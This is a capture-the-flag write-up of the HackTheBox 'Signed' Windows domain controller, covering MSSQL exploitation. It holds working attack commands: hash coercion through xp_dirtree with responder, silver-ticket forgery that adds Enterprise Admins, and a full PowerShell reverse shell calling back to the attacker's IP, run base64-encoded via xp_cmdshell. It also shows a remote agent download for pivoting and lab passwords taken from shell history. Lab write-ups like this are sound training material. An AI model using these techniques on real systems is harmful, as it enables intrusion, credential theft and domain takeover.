---
title: HackTheBox - Signed writeup (Windows/Medium) - with unintended root
categories: [HackTheBox]
tags: [HackTheBox, signed, windows, season9, assume-breach, AD, nmap, mssql, mssql-exploitaion, nxc, nxc-mssql, mssqlclient, xp_cmdshell, xp_dirtree, NTLMv2, responder, john, mssql-sysadmin, pycryptodome, enum_logins, SUSER_SID, SIDTool, OPENROWSET, powershell, utf-16le, iconv, ligolo-ng, bloodyad, bloodyad-get-writable, powershell-history]
render_with_liquid: false
---

`signed` is an assume-breach medium windows box from season 9, where I was given the credentials of `scott`, I was able to leak `mssqlsvc` `netntlmv2` hash using `xp_dirtree` and crack it, then use the credentials to forge a silver ticket, as both a privileged user and a member of the `Enterprise admins` group, in this writeup I shows 2 ways of getting the user flag, by both getting a shell using `xp_cmdshell` and by directly getting a shell as `administrator`

## Recon
### nmap
I ran `nmap` to find that the machine is a domain controller with only `mssql` exposed, domain is `SIGNED.HTB`, DC host name is `DC01` 
```bash
$ nmap -sCSV -vv -oN signed 10.129.18.203
# Nmap 7.97 scan initiated Sat Oct 11 21:56:24 2025 as: nmap -sCSV -vv -oN signed 10.129.14.61
Nmap scan report for 10.129.18.203 (10.129.18.203)
Host is up, received echo-reply ttl 127 (0.19s latency).
Scanned at 2025-10-11 21:56:25 +01 for 114s
Not shown: 999 filtered tcp ports (no-response)
PORT     STATE SERVICE  REASON          VERSION
1433/tcp open  ms-sql-s syn-ack ttl 127 Microsoft SQL Server 2022 16.00.1000.00; RTM
| ms-sql-ntlm-info:
|   10.129.14.61:1433:
|     Target_Name: SIGNED
|     NetBIOS_Domain_Name: SIGNED
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: SIGNED.HTB
|     DNS_Computer_Name: DC01.SIGNED.HTB
|     DNS_Tree_Name: SIGNED.HTB
|_    Product_Version: 10.0.17763
| ms-sql-info:
|   10.129.14.61:1433:
|     Version:
|       name: Microsoft SQL Server 2022 RTM
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 3072
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-10-11T19:13:39
| Not valid after:  2055-10-11T19:13:39
| MD5:     3dd9 9903 eee2 ca2a e6d0 b98d 93ca ab5c
| SHA-1:   81a7 a749 e727 6628 d114 3c35 db3a 90e2 a7c8 69ee
| SHA-256: c88a 907d 7883 846e 0480 5dee a3b1 ea43 d172 0418 3fad 0372 d462 b5e4 bb03 bf16
| -----BEGIN CERTIFICATE-----
...
|_-----END CERTIFICATE-----
|_ssl-date: 2025-10-11T20:58:19+00:00; 0s from scanner time.

Host script results:
|_clock-skew: mean: 0s, deviation: 0s, median: 0s
```

usually the DC has many ports open, in this scenario tho the other ports are likely protected by a firewall indicating that the initial foothold is gonna be focused on `mssql` exploitation

since I know the domain and the machine hostname I added the following entry to my `/etc/hosts`
```bash
10.129.18.203     DC01.signed.htb signed.htb DC01
```

### Mssql enum
#### Initial credentials
As this is an assume-breach box, the following credentials were provided
> As is common in real life Windows penetration tests, you will start the Signed box with credentials for the following account which can be used to access the  `MSSQL` service: `scott` / `Sm230#C5NatH`

creds worked for `mssql` local auth
```bash
$ nxc mssql signed.htb -u scott -p 'Sm230#C5NatH'
MSSQL       10.129.18.203   1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:SIGNED.HTB) (EncryptionReq:False)
MSSQL       10.129.18.203   1433   DC01             [-] SIGNED.HTB\scott:'Sm230#C5NatH' (Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication. Please try again with or without '--local-auth')
$ nxc mssql signed.htb -u scott -p Sm230#C5NatH --local-auth
MSSQL       10.129.18.203   1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:SIGNED.HTB) (EncryptionReq:False)
MSSQL       10.129.18.203   1433   DC01             [+] DC01\scott:'Sm230#C5NatH'  
```
## users.txt

### mssqlsvc
I used `mssqlclient.py` to connect to the db, where `scott` could login as a guest
```bash
$ mssqlclient.py signed.htb/scott:Sm230#C5NatH@signed.htb
...
SQL (scott  guest@master)>
```

`xp_cmdshell` was disabled and `scott` didn't have perms to enable it
```
SQL (scott  guest@master)> xp_cmdshell lol
ERROR(DC01): Line 1: The EXECUTE permission was denied on the object 'xp_cmdshell', database 'mssqlsystemresource', schema 'sys'.
SQL (scott  guest@master)> enable_xp_cmdshell
ERROR(DC01): Line 105: User does not have permission to perform this action.
ERROR(DC01): Line 1: You do not have permission to run the RECONFIGURE statement.
ERROR(DC01): Line 62: The configuration option 'xp_cmdshell' does not exist, or it may be an advanced option.
ERROR(DC01): Line 1: You do not have permission to run the RECONFIGURE statement.
```

there were no links, no impersonation privs, nor any databases other than the default ones, `xp_dirtree` command worked but my user didn't have perms to list any files
```bash
SQL (scott  guest@master)> xp_dirtree
subdirectory   depth   file
------------   -----   ----
SQL (scott  guest@master)> xp_dirtree \
subdirectory   depth   file
------------   -----   ----
```

eventually I was able to use it to leak `mssqlsvc` `NTLMv2`'s hash via coercion and catch it using `responder` 

```bash
SQL (scott  guest@master)> xp_dirtree \\10.10.15.207\share\lol
subdirectory   depth   file
------------   -----   ----
```

in my machine
```bash
$ sudo responder -I tun0 -v
...
[SMB] NTLMv2-SSP Client   : 10.129.18.203
[SMB] NTLMv2-SSP Username : SIGNED\mssqlsvc
[SMB] NTLMv2-SSP Hash     : mssqlsvc::SIGNED:eceae637b958c491:05A3FBAF23BC35CB14C64405B72454BA:010100000000000000CF432A7F97DC01846B2E828798ED5900000000020008004A0038004300580001001E00570049004E002D004400460032004D00580053005900360036004D004C0004003400570049004E002D004400460032004D00580053005900360036004D004C002E004A003800430058002E004C004F00430041004C00030014004A003800430058002E004C004F00430041004C00050014004A003800430058002E004C004F00430041004C000700080000CF432A7F97DC01060004000200000008003000300000000000000000000000003000004023CB3B3BB6B8D4C5F71DF379B79F967AE75E38A605F2ACAACB7FE2020A3C7F0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310035002E003200300037000000000000000000
```

I was able to crack the hash with `john` and recover `mssqlsvc`'s `mssql` password
```bash
$ john hash --format=netntlmv2 --wordlist=$ROCK
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
purPLE9795!@     (mssqlsvc)
1g 0:00:00:00 DONE (2026-02-06 16:10) 1.694g/s 7608Kp/s 7608Kc/s 7608KC/s purtynpinkbarbie@aol.com..punochue8
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed
```

creds worked over `mssql` without local auth
```bash
$ nxc mssql signed.htb -u mssqlsvc -p 'purPLE9795!@'
MSSQL       10.129.18.203   1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:SIGNED.HTB) (EncryptionReq:False)
MSSQL       10.129.18.203   1433 # user.txt  DC01             [+] SIGNED.HTB\mssqlsvc:purPLE9795!@
```

I could log in with `mssqlclient.py` using `mssqlsvc` as `guest` again, so nothing really changed when it comes to perms, however when enumerating logins I found a group `SIGNED\IT` which has `sysadmin` privs enabled
```bash
SQL (SIGNED\mssqlsvc  guest@master)> enum_logins
name                                type_desc       is_disabled   sysadmin   securityadmin   serveradmin   setupadmin   processadmin   diskadmin   dbcreator   bulkadmin
---------------------------------   -------------   -----------   --------   -------------   -----------   ----------   ------------   ---------   ---------   ---------
sa                                  SQL_LOGIN                 0          1               0             0            0              0           0           0           0
##MS_PolicyEventProcessingLogin##   SQL_LOGIN                 1          0               0             0            0              0           0           0           0
##MS_PolicyTsqlExecutionLogin##     SQL_LOGIN                 1          0               0             0            0              0           0           0           0
SIGNED\IT                           WINDOWS_GROUP             0          1               0             0            0              0           0           0           0
NT SERVICE\SQLWriter                WINDOWS_LOGIN             0          1               0             0            0              0           0           0           0
NT SERVICE\Winmgmt                  WINDOWS_LOGIN             0          1               0             0            0              0           0           0           0
NT SERVICE\MSSQLSERVER              WINDOWS_LOGIN             0          1               0             0            0              0           0           0           0
NT AUTHORITY\SYSTEM                 WINDOWS_LOGIN             0          0               0             0            0              0           0           0           0
NT SERVICE\SQLSERVERAGENT           WINDOWS_LOGIN             0          1               0             0            0              0           0           0           0
NT SERVICE\SQLTELEMETRY             WINDOWS_LOGIN             0          0               0             0            0              0           0           0           0
scott                               SQL_LOGIN                 0          0               0             0            0              0           0           0           0
SIGNED\Domain Users                 WINDOWS_GROUP             0          0               0             0            0              0           0           0           0

```

### Performing a silver ticket attack
#### Introduction
I was going to write a bit about the silver ticket attack but I figured it's better to write a separate post about kerberos and tickets in the future, so for now this paragraph remains as a placeholder
but TLDR if you have the creds for a service account, you can forge tickets offline to log in as any user on that service, and and log in as if that user is a part of any AD group (such as `Enterprise admins` wink wink), because the service validates the ticket, and doesn't ask the DC to validate it

#### Getting the needed info for the silver ticket
since I have the credentials of a service account (mssql*svc*), I could forge a silver ticket offline, but first I have to do some enum cause to forge a silver ticket I need the following data:
- the `NT` hash of the service user, in this case `mssqlsvc` (not to be confused with `netntlmv2` hash)
- the domain security identifier (SID)
- the user relative identifier (RID
- the group relative identifier (RID) of the target we're gonna be authenticating as

##### NT hash of mssqlsvc
since we know the password, we can compute the `NT` hash with the following python one liner after installing `pycryptodome`
```bash
$ python -c 'from Crypto.Hash import MD4; print(MD4.new("purPLE9795!@".encode("utf-16le")).hexdigest())'
ef699384c3285c54128a3ee1ddb1a0cc
```
##### Domain SID
we can use the `enum_logins` command in `mssqlclient` to get a list of users, then use `SUSER_SID` function to get the `SID` of any domain user/group,  in this case either `SIGNED\IT` or `SIGNED\Domain Users` could do 

```bash

SQL (SIGNED\mssqlsvc  guest@master)> SELECT SUSER_SID('SIGNED\IT')

-----------------------------------------------------------
b'0105000000000005150000005b7bb0f398aa2245ad4a1ca451040000'
```

we get a hex representation of the actual SID, I used [SIDTool](https://github.com/TheManticoreProject/SIDTool) to convert it to ascii
```bash
$ SIDTool-linux-amd64 --value 0105000000000005150000005b7bb0f398aa2245ad4a1ca451040000 -s
SIDTool - by Remi GASCOU (Podalirius) - v1.1

S-1-5-21-4088429403-1159899800-2753317549-1105
```

this is the format `$DOMAIN_SID-$GROUP_RID` so the actual domain `SID` is `S-1-5-21-4088429403-1159899800-2753317549` and the `RID` of the group `SIGNED\IT` is 1105
##### mssqlsvc RID
in the same way we got the domain `SID` I used `SUSER_SID` function to get the `RID` of `mssqlsvc` then convert it to `ascii` to find the value `1103`
```bash
SQL (SIGNED\mssqlsvc  dbo@master)> SELECT SUSER_SID('SIGNED\mssqlsvc')

-----------------------------------------------------------
b'0105000000000005150000005b7bb0f398aa2245ad4a1ca44f040000'
```

```bash
$ SIDTool-linux-amd64 -v 0105000000000005150000005b7bb0f398aa2245ad4a1ca44f040000 -s
SIDTool - by Remi GASCOU (Podalirius) - v1.1

S-1-5-21-4088429403-1159899800-2753317549-1103
```
##### Target group RID
from the section where we got the domain SID we know that we want to be member of the group with RID 1105
##### Forging the ticket
now we have all the info we need we can forge a ticket offline, I'll use the spn `mssqlsvc/dc01.signed.htb`, but technically that can be anything

note that for the attack to work, the ticket has to include an arbitrary group where the user is actually a member of, so I used `513` (`domain users`)
```bash
$ ticketer.py -nthash ef699384c3285c54128a3ee1ddb1a0cc \
 -domain-sid S-1-5-21-4088429403-1159899800-2753317549 \
 -domain signed.htb \
 -user-id 1103 \
 -groups 1105,513 \
 -spn mssqlsvc/dc01.signed.htb mssqlsvc
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for signed.htb/mssqlsvc
[*] 	PAC_LOGON_INFO
[*] 	PAC_CLIENT_INFO_TYPE
[*] 	EncTicketPart
[*] 	EncTGSRepPart
[*] Signing/Encrypting final ticket
[*] 	PAC_SERVER_CHECKSUM
[*] 	PAC_PRIVSVR_CHECKSUM
[*] 	EncTicketPart
[*] 	EncTGSRepPart
[*] Saving ticket in mssqlsvc.ccache
```

and use it to login as `SIGNED\IT` which can act as `dbo@master`
```bash
$ export KRB5CCNAME=mssqlsvc.ccache
$ mssqlclient.py -k dc01.signed.htb -debug
...
SQL (SIGNED\mssqlsvc  dbo@master)>
```

from here I can read the user flag using `OPENROWSET`
```bash
SQL (SIGNED\mssqlsvc  dbo@master)> SELECT * FROM OPENROWSET(BULK '\Users\mssqlsvc\Desktop\user.txt', SINGLE_CLOB) AS x;
BulkColumn
---------------------------------------
b'0437ac3edc1aa122731b5b21822fd1e0\r\n'
```

I could also execute commands with `xp_cmdshell` now that I'm `dbo`
```bash
SQL (SIGNED\mssqlsvc  dbo@master)> xp_cmdshell whoami
output
---------------
signed\mssqlsvc
NULL
```

so I grabbed a reverse shell `powershell` script, converted it to `utf-16le` cause windows prefers that, then to base64 and executed it with `xp_cmdshell`

```bash
$ cat rev.ps1
$client = New-Object System.Net.Sockets.TCPClient('10.10.15.207', 10000);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
    $data = ([System.Text.Encoding]::ASCII).GetString($bytes, 0, $i);
    $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String);
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([System.Text.Encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte, 0, $sendbyte.Length);
    $stream.Flush();
}
$client.Close();
```

```
$ cat rev.ps1 | iconv -t UTF-16LE | base64 -w 0
JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA1AC4AMgAwADcAJwAsACAAMQAwADAAMAAwACkAOwAKACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AAoAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwAKAHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAIAB7AAoAIAAgACAAIAAkAGQAYQB0AGEAIAA9ACAAKABbAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAgADAALAAgACQAaQApADsACgAgACAAIAAgACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAALQBDAG8AbQBtAGEAbgBkACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACkAOwAKACAAIAAgACAAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAnAFAAUwAgACcAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAnAD4AIAAnADsACgAgACAAIAAgACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAKACAAIAAgACAAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAIAAwACwAIAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAKACAAIAAgACAAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAOwAKAH0ACgAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA7AAoA
```

```
SQL (SIGNED\mssqlsvc  dbo@master)> xp_cmdshell powershell.exe -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA1AC4AMgAwADcAJwAsACAAMQAwADAAMAAwACkAOwAKACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AAoAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwAKAHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAIAB7AAoAIAAgACAAIAAkAGQAYQB0AGEAIAA9ACAAKABbAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAgADAALAAgACQAaQApADsACgAgACAAIAAgACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAALQBDAG8AbQBtAGEAbgBkACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACkAOwAKACAAIAAgACAAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAnAFAAUwAgACcAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAnAD4AIAAnADsACgAgACAAIAAgACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAKACAAIAAgACAAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAIAAwACwAIAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAKACAAIAAgACAAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAOwAKAH0ACgAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA7AAoA
```

in my other terminal i got a revshell and got the flag
```bash
$ nc -lnvp 10000
Listening on 0.0.0.0 10000
Connection received on 10.129.242.173 59035
whoami
signed\mssqlsvc
PS C:\Windows\system32> PS C:\Windows\system32> cat \Users\mssqlsvc\Desktop\user.txt
04****************************e0
```

#### Getting stuck after doing network pivoting

now that I got a shell, I uploaded a `ligolo-ng` client to further poke at the other ports

##### In my machine
```bash
$ sudo ip tuntap add user `whoami` mode tun ligolo
$ sudo ip link set ligolo up
$ sudo ip route add 240.0.0.1/32 dev ligolo
$ sudo ligolo-ng-proxy -selfcert
```

##### In powershell
```bash
PS C:\programdata> wget http://10.10.15.207:6969/agent.exe -O agent.exe
PS C:\programdata> ./agent.exe -connect	10.10.15.207:11601 -ignore-cert
```

after starting the session forwarding in `ligolo-ng`, and replacing `signed.htb`  entry in my `/etc/hosts` to make it point to `240.0.0.1` instead, I was able to reach the internal ports

I used `bloodyad` to check what objects `mssqlsvc` can write to, and found few results related to dns entries
```bash
$ bloodyAD --host signed.htb -d signed.htb -u mssqlsvc -p 'purPLE9795!@' get writable

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=SIGNED,DC=HTB
permission: WRITE

distinguishedName: CN=mssqlsvc,CN=Users,DC=SIGNED,DC=HTB
permission: WRITE
...

distinguishedName: DC=DomainDnsZones,DC=SIGNED.HTB,CN=MicrosoftDNS,DC=DomainDnsZones,DC=SIGNED,DC=HTB
permission: WRITE
OWNER: WRITE
DACL: WRITE

distinguishedName: DC=ForestDnsZones,DC=SIGNED.HTB,CN=MicrosoftDNS,DC=DomainDnsZones,DC=SIGNED,DC=HTB
permission: WRITE
OWNER: WRITE
DACL: WRITE

distinguishedName: DC=_msdcs.SIGNED.HTB,CN=MicrosoftDNS,DC=ForestDnsZones,DC=SIGNED,DC=HTB
permission: CREATE_CHILD
```

however I didn't go down this route, cause around this time I started learning more about silver tickets and I found an alternative way to directly get to Administrator without getting `mssqlsvc` first

## A direct route to root.txt
### Getting the root flag

revisiting the silver ticket attack, we impersonated a member of the `SIGNED\IT` group cause it had admin privs on `mssql`, but why stop there, why not add `enterprise admins` too, the highest privileged group in AD, with a known `RID` 519, so we can both have sys admin privs as well as the highest perms in AD (note that any admins group such as `domain admins, RID 512` would work, but it wouldn't be as dramatic as 519 sooo) 

now I just have to generate another ticket where I make my user an `enterprise admin`
```bash
$ ticketer.py -nthash ef699384c3285c54128a3ee1ddb1a0cc \
 -domain-sid S-1-5-21-4088429403-1159899800-2753317549 \
 -domain signed.htb \
 -user-id 1103 \
 -groups 1105,513,519 \
 -spn mssqlsvc/dc01.signed.htb mssqlsvc
```

then we can login with the ticket and read both the root flag and the user flag using `OPENROWSET`
```bash
$ mssqlclient.py -k dc01.signed.htb -debug
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[+] Impacket Library Installation Path: /usr/lib/python3.14/site-packages/impacket
[*] Encryption required, switching to TLS
[+] Using Kerberos Cache: mssqlsvc.ccache
[+] Domain retrieved from CCache: SIGNED.HTB
[+] SPN MSSQLSVC/DC01.SIGNED.HTB:1433@SIGNED.HTB not found in cache
[+] AnySPN is True, looking for another suitable SPN
[+] Returning cached credential for MSSQLSVC/DC01.SIGNED.HTB@SIGNED.HTB
[+] Using TGS from cache
[+] Changing sname from mssqlsvc/dc01.signed.htb@SIGNED.HTB to MSSQLSVC/DC01.SIGNED.HTB:1433@SIGNED.HTB and hoping for the best
[+] Username retrieved from CCache: mssqlsvc
[+] Computed tls-unique CBT token: 62949cf9ef152a96b380d448c2bcb6fa
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
[!] Press help for extra shell commands
SQL (SIGNED\mssqlsvc  dbo@master)> SELECT * FROM OPENROWSET(BULK 'C:\Users\Administrator\Desktop\root.txt', SINGLE_CLOB) AS x;
BulkColumn
---------------------------------------
b'4885603af76e2389d595d978ac012016\r\n'
SQL (SIGNED\mssqlsvc  dbo@master)> SELECT * FROM OPENROWSET(BULK 'C:\Users\mssqlsvc\Desktop\user.txt', SINGLE_CLOB) AS x;
BulkColumn
---------------------------------------
b'0437ac3edc1aa122731b5b21822fd1e0\r\n'
SQL (SIGNED\mssqlsvc  dbo@master)>
```

however when trying to execute a command with `xp_cmdshell` it acted as if it's the user is still `SIGNED\mssqlsvc` and not a member of `Enterprise Admins`
```bash
SQL (SIGNED\mssqlsvc  dbo@master)> xp_cmdshell whoami
output
---------------
signed\mssqlsvc
NULL
```

I was confused a bit at first, but when I looked it up I found that the `xp_cmdshell` drops the privileges of  the logged in user for the command execution, and instead it runs using the service account's credentials, service account being the `mssqlsvc` account, so upon getting a reverse shell I was only able to get one as the `mssqlsvc` user

### Getting a shell as administrator

looking around for interesting files to read, I found the powershell history at `C:\Users\administrator\appdata\roaming\microsoft\windows\powershell\PSReadline\consolehost_history.txt` which I could read with the following command
```bash
SQL (SIGNED\mssqlsvc  dbo@master)> SELECT * FROM OPENROWSET(BULK 'C:\Users\administrator\appdata\roaming\microsoft\windows\powershell\PSReadline\consolehost_history.txt', SINGLE_CLOB) AS x;
```

inside I found the command changing the `administrator`'s password
```
Set-ADAccountPassword -Identity "Administrator" -NewPassword (ConvertTo-SecureString "Th1s889Rabb!t" -AsPlainText -Force) -Reset
```

since I still had `ligolo-ng` client running I was able to get a `winrm` shell via port 5986 (the non-ssl wasn't open)
```bash
$ evil-winrm -i 240.0.0.1 -u administrator -p 'Th1s889Rabb!t' -S
...
*Evil-WinRM* PS C:\Users\Administrator\Documents> cat ../Desktop/root.txt
48****************************16
```

after getting `administrator` on the box I found 2 scripts that clean up the dns entries hinting on the actual intended way to root the box
```powershell
*Evil-WinRM* PS C:\Users\Administrator\Documents> ls


    Directory: C:\Users\Administrator\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        10/2/2025   9:51 AM           3512 cleanup.ps1
-a----        10/2/2025   9:55 AM             85 restart.ps1


*Evil-WinRM* PS C:\Users\Administrator\Documents> cat restart.ps1
while ($true) {
    Restart-Service -Name DNS -Force
    Start-Sleep -Seconds 10
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

the other file is too long to paste here

however I didn't know better at the time and just stopped at getting the root flag from `mssql`
